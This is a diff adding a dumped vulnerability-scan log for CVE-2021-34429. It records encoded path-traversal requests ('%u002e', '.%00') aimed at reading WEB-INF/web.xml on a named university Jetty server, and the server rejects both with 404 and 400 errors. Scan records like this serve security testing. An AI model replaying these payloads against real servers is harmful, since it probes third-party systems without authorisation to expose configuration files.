@@ -1,0 +1,66 @@
+[CVE-2021-34429] Dumped HTTP request for https://pipeline.eresearch.unimelb.edu.au/%u002e/WEB-INF/web.xml
+
+
+GET /%u002e/WEB-INF/web.xml HTTP/1.1
+Host: pipeline.eresearch.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Origin: https://pipeline.eresearch.unimelb.edu.au
+
+
+[CVE-2021-34429] Dumped HTTP response https://pipeline.eresearch.unimelb.edu.au/%u002e/WEB-INF/web.xml
+
+HTTP/1.1 404 Not Found
+Content-Length: 455
+cache-control: must-revalidate,no-cache,no-store
+content-length: 455
+content-type: text/html;charset=iso-8859-1
+date: Wed, 06 Aug 2025 15:18:12 GMT
+server: Jetty(12.0.22)
+strict-transport-security: max-age=63072000
+vary: Accept-Encoding
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+<title>Error 404 Not Found</title>
+</head>
+<body>
+<h2>HTTP ERROR 404 Not Found</h2>
+<table>
+<tr><th>URI:</th><td>https://pipeline.eresearch.unimelb.edu.au/%u002e/WEB-INF/web.xml</td></tr>
+<tr><th>STATUS:</th><td>404</td></tr>
+<tr><th>MESSAGE:</th><td>Not Found</td></tr>
+</table>
+<hr/><a href="https://jetty.org/">Powered by Jetty:// 12.0.22</a><hr/>
+
+</body>
+</html>
+
+[CVE-2021-34429] Dumped HTTP response https://pipeline.eresearch.unimelb.edu.au/.%00/WEB-INF/web.xml
+
+HTTP/1.1 400 Bad Request
+Content-Length: 408
+cache-control: must-revalidate,no-cache,no-store
+content-length: 408
+content-type: text/html;charset=iso-8859-1
+date: Wed, 06 Aug 2025 15:18:13 GMT
+server: Jetty(12.0.22)
+strict-transport-security: max-age=63072000
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+<title>Error 400 Bad Request</title>
+</head>
+<body>
+<h2>HTTP ERROR 400 Bad Request</h2>
+<table>
+<tr><th>URI:</th><td>/badMessage</td></tr>
+<tr><th>STATUS:</th><td>400</td></tr>
+<tr><th>MESSAGE:</th><td>Bad Request</td></tr>
+</table>
+<hr/><a href="https://jetty.org/">Powered by Jetty:// 12.0.22</a><hr/>
+
+</body>
+</html>
+
